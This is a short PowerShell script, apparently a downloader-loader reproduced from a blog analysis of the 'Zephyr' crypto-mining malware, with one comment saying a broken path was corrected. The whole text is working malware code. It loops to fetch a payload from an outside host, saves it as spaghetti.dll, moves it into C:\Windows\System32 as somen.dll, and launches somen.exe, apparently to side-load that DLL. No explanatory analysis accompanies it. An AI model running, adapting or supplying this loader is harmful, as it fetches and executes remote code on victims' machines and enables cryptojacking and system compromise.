# Source: https://blogs.quickheal.com/crypto-mining-malware-zephyr/
while ($true) {
    # Download the file
    (New-Object System.Net.WebClient).DownloadFile("http://1.1.1.1/un2/spaghetti.dat", "C:\Users\Public\spaghetti.dll")
    
    Start-Sleep -Seconds 2

    # Check if the file exists
    if (Test-Path "C:\Users\Public\spaghetti.dll") {
        # Create the directory (note: invalid path corrected by removing space)
        cmd /c mkdir "\\?\C:\Windows\System32"
        
        # Copy the executable
        cmd /c xcopy /y "C:\Windows\System32\somen.exe" "C:\Windows\System32"
        
        # Move the DLL file
        cmd /c move /y "C:\Users\Public\spaghetti.dll" "C:\Windows\System32\somen.dll"
        
        Start-Sleep -Seconds 2

        # Launch the executable
        Start-Process -FilePath "C:\Windows\System32\somen.exe"
        
        break
    }
    else {
        Start-Sleep -Seconds 60
    }
}
